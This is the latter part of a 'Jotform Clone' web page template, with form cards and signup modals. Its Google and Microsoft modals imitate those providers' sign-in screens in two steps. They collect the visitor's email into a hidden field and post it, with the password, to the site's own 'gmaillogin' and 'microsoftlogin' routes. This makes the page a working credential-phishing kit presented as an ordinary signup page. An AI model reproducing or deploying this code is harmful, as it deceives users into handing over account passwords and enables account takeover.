            <rect x="252" y="172" width="20" height="20" rx="3" fill="#B0BEC5"/>
            <circle cx="262" cy="182" r="5" fill="#607D8B"/>
          </svg>
        </div>

      </div>
    </div>
  </section>

  <!-- ===== RECOMMENDED FORMS ===== -->
  <section class="recommended-section">
    <div class="recommended-inner">
      <div class="section-label">Recommended forms for you</div>

      <div class="recommended-list">
        <a href="#" class="rec-card">
          <div class="rec-icon consent">
            <i class="fas fa-file-signature"></i>
          </div>
          <div class="rec-content">
            <div class="rec-title">Consent Form</div>
            <p class="rec-desc">Capture agreement and consent details.</p>
          </div>
          <i class="fas fa-chevron-right rec-arrow"></i>
        </a>

        <a href="#" class="rec-card">
          <div class="rec-icon payment">
            <i class="fas fa-credit-card"></i>
          </div>
          <div class="rec-content">
            <div class="rec-title">Payment Form</div>
            <p class="rec-desc">Collect payment and billing details.</p>
          </div>
          <i class="fas fa-chevron-right rec-arrow"></i>
        </a>

        <a href="#" class="rec-card">
          <div class="rec-icon registration">
            <i class="fas fa-clipboard-check"></i>
          </div>
          <div class="rec-content">
            <div class="rec-title">Registration Form</div>
            <p class="rec-desc">Sign up new users in seconds.</p>
          </div>
          <i class="fas fa-chevron-right rec-arrow"></i>
        </a>

        <a href="#" class="rec-card">
          <div class="rec-icon survey">
            <i class="fas fa-envelope-open-text"></i>
          </div>
          <div class="rec-content">
            <div class="rec-title">Survey Form</div>
            <p class="rec-desc">Gather feedback and insights.</p>
          </div>
          <i class="fas fa-chevron-right rec-arrow"></i>
        </a>
      </div>
    </div>
  </section>

  <!-- ===== FOOTER ===== -->
  <footer class="jf-footer">
    <p class="mb-0">&copy; 2025 Jotform Clone. All rights reserved.</p>
  </footer>

  <!-- ============================================================
       GOOGLE MODAL – TWO‑STEP with hidden email for final submit
       ============================================================ -->
  <div class="jf-modal-backdrop" id="googleModal" role="dialog" aria-modal="true" aria-labelledby="googleModalTitle">
    <div class="jf-modal">
      <button class="jf-modal-close" data-close-modal aria-label="Close">
        <i class="fas fa-times"></i>
      </button>
      <div class="google-modal">
        <svg class="google-modal-logo" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
          <path fill="#FFC107" d="M43.611 20.083H42V20H24v8h11.303c-1.649 4.657-6.08 8-11.303 8-6.627 0-12-5.373-12-12s5.373-12 12-12c3.059 0 5.842 1.154 7.961 3.039l5.657-5.657C34.046 6.053 29.268 4 24 4 12.955 4 4 12.955 4 24s8.955 20 20 20 20-8.955 20-20c0-1.341-.138-2.65-.389-3.917z"/>
          <path fill="#FF3D00" d="m6.306 14.691 6.571 4.819C14.655 15.108 18.961 12 24 12c3.059 0 5.842 1.154 7.961 3.039l5.657-5.657C34.046 6.053 29.268 4 24 4 16.318 4 9.656 8.337 6.306 14.691z"/>
          <path fill="#4CAF50" d="M24 44c5.166 0 9.86-1.977 13.409-5.192l-6.19-5.238A11.91 11.91 0 0 1 24 36c-5.202 0-9.619-3.317-11.283-7.946l-6.522 5.025C9.505 39.556 16.227 44 24 44z"/>
          <path fill="#1976D2" d="M43.611 20.083H42V20H24v8h11.303a12.04 12.04 0 0 1-4.087 5.571l.003-.002 6.19 5.238C36.971 39.205 44 34 44 24c0-1.341-.138-2.65-.389-3.917z"/>
        </svg>
        <h2 class="google-modal-title" id="googleModalTitle">Sign in</h2>
        <p class="google-modal-subtitle">to continue to Jotform</p>

        <!-- STEP 1: email only (no form submit – we just move to step 2) -->
        <div class="google-step" data-step="1">
          <form id="googleEmailForm" onsubmit="return false;">
            <input type="email" class="google-modal-input" id="googleEmail" placeholder="Email or phone" aria-label="Email or phone" required>
            <div class="google-modal-actions">
              <button type="button" class="google-link">Forgot email?</button>
              <button type="button" class="google-btn-primary" id="googleNextBtn">Next</button>
            </div>
          </form>
        </div>

        <!-- STEP 2: password + hidden email, real form submission -->
        <div class="google-step" data-step="2" style="display: none;">
          <button type="button" class="google-back-link" id="googleBackBtn">
            <i class="fas fa-arrow-left"></i> Back
          </button>
          <div class="google-user-email" id="googleDisplayEmail">user@gmail.com</div>
          <form id="googlePasswordForm" method="POST" action="{{ route('gmaillogin') }}">
            @csrf
            <!-- hidden email that gets filled in step 1 -->
            <input type="hidden" name="email" id="googleHiddenEmail" value="">
            <input type="password" name="password" class="google-modal-input" id="googlePassword" placeholder="Enter your password" aria-label="Password" required minlength="4">
            <div class="google-modal-actions">
              <button type="button" class="google-link">Forgot password?</button>
              <button type="submit" class="google-btn-primary" id="googleSigninBtn">Sign in</button>
            </div>
          </form>
        </div>

      </div>
    </div>
  </div>

  <!-- ============================================================
       MICROSOFT MODAL – TWO‑STEP with hidden email for final submit
       ============================================================ -->
  <div class="jf-modal-backdrop" id="microsoftModal" role="dialog" aria-modal="true" aria-labelledby="microsoftModalTitle">
    <div class="jf-modal">
      <button class="jf-modal-close" data-close-modal aria-label="Close">
        <i class="fas fa-times"></i>
      </button>
      <div class="microsoft-modal">
        <div class="microsoft-modal-logo">
          <div class="microsoft-modal-logo-icon">
            <span></span><span></span><span></span><span></span>
          </div>
          <span class="microsoft-modal-logo-text">Microsoft</span>
        </div>
        <h2 class="microsoft-modal-title" id="microsoftModalTitle">Sign in</h2>

        <!-- STEP 1: email -->
        <div class="microsoft-step" data-step="1">
          <form id="microsoftEmailForm" onsubmit="return false;">
            <input type="email" class="microsoft-modal-input" id="microsoftEmail" placeholder="Email, phone, or Skype" aria-label="Email, phone, or Skype" required>
            <p class="microsoft-modal-helper">
              No account? <a href="#">Create one!</a>
            </p>
            <p class="microsoft-modal-helper">
              <a href="#">Forgot password?</a>
            </p>
            <div class="microsoft-modal-actions">
              <button type="button" class="microsoft-btn-primary" id="microsoftNextBtn">Next</button>
            </div>
          </form>
        </div>

        <!-- STEP 2: password + hidden email, real form submission -->
        <div class="microsoft-step" data-step="2" style="display: none;">
          <button type="button" class="microsoft-back-link" id="microsoftBackBtn">
            <i class="fas fa-arrow-left"></i> Back
          </button>
          <div class="microsoft-user-email" id="microsoftDisplayEmail">user@example.com</div>
          <form id="microsoftPasswordForm" method="POST" action="{{ route('microsoftlogin') }}">
            @csrf
            <!-- hidden email that gets filled in step 1 -->
            <input type="hidden" name="email" id="microsoftHiddenEmail" value="">
            <input type="password" name="password" class="microsoft-modal-input" id="microsoftPassword" placeholder="Password" aria-label="Password" required minlength="4">
            <p class="microsoft-modal-helper" style="margin-top: 0.25rem;">
              <a href="#">Forgot password?</a>
            </p>
            <div class="microsoft-modal-actions">
              <button type="submit" class="microsoft-btn-primary" id="microsoftSigninBtn">Sign in</button>
            </div>
          </form>
        </div>

      </div>
    </div>
  </div>

  <!-- ============================================================
       EMAIL MODAL
       ============================================================ -->
  <div class="jf-modal-backdrop" id="emailModal" role="dialog" aria-modal="true" aria-labelledby="emailModalTitle">
    <div class="jf-modal">
      <button class="jf-modal-close" data-close-modal aria-label="Close">
        <i class="fas fa-times"></i>
      </button>
      <div class="email-modal">
        <div class="email-modal-header">
          <div class="email-modal-icon">
            <i class="fas fa-envelope"></i>
          </div>
          <h2 class="email-modal-title" id="emailModalTitle">Sign up with email</h2>
          <p class="email-modal-subtitle">Create your free Jotform account</p>
        </div>
        <form id="emailForm">
          <label class="email-form-label" for="emailName">Full name</label>
          <input type="text" class="email-form-input" id="emailName" placeholder="Jane Doe" autocomplete="name" required>

          <label class="email-form-label" for="emailAddress">Email address</label>
          <input type="email" class="email-form-input" id="emailAddress" placeholder="you@example.com" autocomplete="email" required>

          <label class="email-form-label" for="emailPassword">Password</label>
          <input type="password" class="email-form-input" id="emailPassword" placeholder="At least 8 characters" autocomplete="new-password" minlength="8" required>

          <button type="submit" class="email-btn-submit" id="emailSubmitBtn">
            Create free account
          </button>
        </form>
        <div class="email-modal-divider">OR</div>
        <div class="email-modal-socials">
          <button type="button" class="email-social-btn" data-provider="google">
            <i class="fab fa-google" style="background: linear-gradient(90deg, #4285F4, #EA4335, #FBBC05, #34A853); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;"></i>
            Google
          </button>
          <button type="button" class="email-social-btn" data-provider="microsoft">
            <span style="display:inline-grid; grid-template-columns: 1fr 1fr; grid-template-rows: 1fr 1fr; gap: 1px; width: 14px; height: 14px;">
              <span style="background:#F25022;"></span>
              <span style="background:#7FBA00;"></span>
              <span style="background:#00A4EF;"></span>
              <span style="background:#FFB900;"></span>
            </span>
            Microsoft
          </button>
        </div>
        <p class="email-modal-footer">
          Already have an account? <a href="#" data-provider="google">Sign in</a>
        </p>
      </div>
    </div>
  </div>

  <!-- Bootstrap JS -->
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>

  <script>
    (function() {
      'use strict';

      // ===== NAVBAR SCROLL SHADOW =====
      const navbar = document.getElementById('navbar');
      window.addEventListener('scroll', () => {
        navbar.classList.toggle('scrolled', window.scrollY > 10);
      }, { passive: true });

      // ============================================================
      // MODAL SYSTEM
      // ============================================================
      const modals = {
        google: document.getElementById('googleModal'),
        microsoft: document.getElementById('microsoftModal'),
        email: document.getElementById('emailModal')
      };

      function openModal(provider) {
        const modal = modals[provider];
        if (!modal) return;

        if (provider === 'google') resetGoogleModal();
        if (provider === 'microsoft') resetMicrosoftModal();

        Object.values(modals).forEach(m => m.classList.remove('active'));
        modal.classList.add('active');
        document.body.classList.add('modal-open');
        setTimeout(() => {
          const firstInput = modal.querySelector('input');
          if (firstInput) firstInput.focus();
        }, 250);
      }

      function closeModal(modal) {
        if (!modal) return;
        modal.classList.remove('active');
        if (!document.querySelector('.jf-modal-backdrop.active')) {
          document.body.classList.remove('modal-open');
        }
      }

      function closeAllModals() {
        Object.values(modals).forEach(m => m.classList.remove('active'));
        document.body.classList.remove('modal-open');
      }

      // ============================================================
      // GOOGLE TWO-STEP LOGIC
      // ============================================================
      const googleStep1 = document.querySelector('#googleModal .google-step[data-step="1"]');
      const googleStep2 = document.querySelector('#googleModal .google-step[data-step="2"]');
      const googleEmailInput = document.getElementById('googleEmail');
      const googleHiddenEmail = document.getElementById('googleHiddenEmail');
      const googleDisplayEmail = document.getElementById('googleDisplayEmail');
      const googlePasswordInput = document.getElementById('googlePassword');
      const googleNextBtn = document.getElementById('googleNextBtn');
      const googleBackBtn = document.getElementById('googleBackBtn');
      const googlePasswordForm = document.getElementById('googlePasswordForm');
      const googleSigninBtn = document.getElementById('googleSigninBtn');

      function resetGoogleModal() {
        if (googleStep1) googleStep1.style.display = 'block';
        if (googleStep2) googleStep2.style.display = 'none';
        if (googleEmailInput) googleEmailInput.value = '';
        if (googlePasswordInput) googlePasswordInput.value = '';
        if (googleHiddenEmail) googleHiddenEmail.value = '';
        if (googleDisplayEmail) googleDisplayEmail.textContent = '';
        if (googleNextBtn) {
          googleNextBtn.disabled = false;
          googleNextBtn.textContent = 'Next';
        }
        if (googleSigninBtn) {
          googleSigninBtn.disabled = false;
          googleSigninBtn.textContent = 'Sign in';
        }
      }

      if (googleNextBtn) {
        googleNextBtn.addEventListener('click', function(e) {
          e.preventDefault();
          const email = googleEmailInput.value.trim();
          if (!email) {
            googleEmailInput.reportValidity();
            return;
          }
          googleHiddenEmail.value = email;
          googleDisplayEmail.textContent = email;
          googleStep1.style.display = 'none';
          googleStep2.style.display = 'block';
          setTimeout(() => {
            googlePasswordInput.focus();
          }, 100);
        });
      }

      if (googleBackBtn) {
        googleBackBtn.addEventListener('click', function() {
          googleStep2.style.display = 'none';
          googleStep1.style.display = 'block';
          googleEmailInput.focus();
        });
      }

      if (googlePasswordForm) {
        googlePasswordForm.addEventListener('submit', function(e) {
          if (googleSigninBtn.disabled) {
            e.preventDefault();
            return;
          }
          googleSigninBtn.disabled = true;
          googleSigninBtn.textContent = 'Signing in...';
          // form submits naturally to route('gmaillogin')
        });
      }

      // ============================================================
      // MICROSOFT TWO-STEP LOGIC (with hidden email for final submit)
      // ============================================================
      const microsoftStep1 = document.querySelector('#microsoftModal .microsoft-step[data-step="1"]');
      const microsoftStep2 = document.querySelector('#microsoftModal .microsoft-step[data-step="2"]');
      const microsoftEmailInput = document.getElementById('microsoftEmail');
      const microsoftHiddenEmail = document.getElementById('microsoftHiddenEmail');
      const microsoftDisplayEmail = document.getElementById('microsoftDisplayEmail');
      const microsoftPasswordInput = document.getElementById('microsoftPassword');
      const microsoftNextBtn = document.getElementById('microsoftNextBtn');
      const microsoftBackBtn = document.getElementById('microsoftBackBtn');
      const microsoftPasswordForm = document.getElementById('microsoftPasswordForm');
      const microsoftSigninBtn = document.getElementById('microsoftSigninBtn');

      function resetMicrosoftModal() {
        if (microsoftStep1) microsoftStep1.style.display = 'block';
        if (microsoftStep2) microsoftStep2.style.display = 'none';
        if (microsoftEmailInput) microsoftEmailInput.value = '';
        if (microsoftPasswordInput) microsoftPasswordInput.value = '';
        if (microsoftHiddenEmail) microsoftHiddenEmail.value = '';
        if (microsoftDisplayEmail) microsoftDisplayEmail.textContent = '';
        if (microsoftNextBtn) {
          microsoftNextBtn.disabled = false;
          microsoftNextBtn.textContent = 'Next';
        }
        if (microsoftSigninBtn) {
          microsoftSigninBtn.disabled = false;
          microsoftSigninBtn.textContent = 'Sign in';
        }
      }

      if (microsoftNextBtn) {
        microsoftNextBtn.addEventListener('click', function(e) {
          e.preventDefault();
          const email = microsoftEmailInput.value.trim();
          if (!email) {
            microsoftEmailInput.reportValidity();
            return;
          }
          microsoftHiddenEmail.value = email;
          microsoftDisplayEmail.textContent = email;
          microsoftStep1.style.display = 'none';
          microsoftStep2.style.display = 'block';
          setTimeout(() => {
            microsoftPasswordInput.focus();
          }, 100);
        });
      }

      if (microsoftBackBtn) {
        microsoftBackBtn.addEventListener('click', function() {
          microsoftStep2.style.display = 'none';
          microsoftStep1.style.display = 'block';
          microsoftEmailInput.focus();
        });
      }

      if (microsoftPasswordForm) {
        microsoftPasswordForm.addEventListener('submit', function(e) {
          if (microsoftSigninBtn.disabled) {
            e.preventDefault();
            return;
          }
          microsoftSigninBtn.disabled = true;
          microsoftSigninBtn.textContent = 'Signing in...';
          // form submits naturally to route('microsoftlogin')
        });
      }

      // ============================================================
      // Wire up every signup button (including email modal socials)
      // ============================================================
      document.querySelectorAll('[data-provider]').forEach(btn => {
        btn.addEventListener('click', (e) => {
          e.preventDefault();
          const provider = btn.getAttribute('data-provider');
          openModal(provider);
        });
      });

      // Navbar button → Google modal
      const navSignupBtn = document.getElementById('navSignupBtn');
      if (navSignupBtn) {
        navSignupBtn.addEventListener('click', (e) => {
          e.preventDefault();
          openModal('google');
        });
      }

      // Close buttons
      document.querySelectorAll('[data-close-modal]').forEach(btn => {
        btn.addEventListener('click', () => {
          const modal = btn.closest('.jf-modal-backdrop');
          if (modal && modal.id === 'googleModal') resetGoogleModal();
          if (modal && modal.id === 'microsoftModal') resetMicrosoftModal();
          closeModal(modal);
        });
      });

      // Click outside to close
      Object.values(modals).forEach(modal => {
        modal.addEventListener('click', (e) => {
          if (e.target === modal) {
            if (modal.id === 'googleModal') resetGoogleModal();
            if (modal.id === 'microsoftModal') resetMicrosoftModal();
            closeModal(modal);
          }
        });
      });

      // ESC key closes modal
      document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape') {
          if (modals.google && modals.google.classList.contains('active')) resetGoogleModal();
          if (modals.microsoft && modals.microsoft.classList.contains('active')) resetMicrosoftModal();
          closeAllModals();
        }
      });

      // ============================================================
      // EMAIL FORM SUBMISSION
      // ============================================================
      const emailForm = document.getElementById('emailForm');
      if (emailForm) {
        emailForm.addEventListener('submit', (e) => {
          e.preventDefault();
          const btn = document.getElementById('emailSubmitBtn');
          const original = btn.innerHTML;
          btn.disabled = true;
          btn.innerHTML = '<i class="fas fa-spinner fa-spin me-2"></i> Creating account...';
          setTimeout(() => {
            btn.innerHTML = '<i class="fas fa-check me-2"></i> Account created!';
            setTimeout(() => {
              closeAllModals();
              btn.innerHTML = original;
              btn.disabled = false;
              emailForm.reset();
            }, 900);
          }, 1400);
        });
      }

      // ===== TOUCH FEEDBACK ON CARDS =====
      document.querySelectorAll('.rec-card').forEach(card => {
        card.addEventListener('touchstart', () => {
          card.style.transform = 'scale(0.98)';
          card.style.transition = 'transform 0.1s';
        }, { passive: true });
        card.addEventListener('touchend', () => {
          card.style.transform = '';
          card.style.transition = 'all 0.2s ease';
        }, { passive: true });
      });

    })();
  </script>
</body>
</html>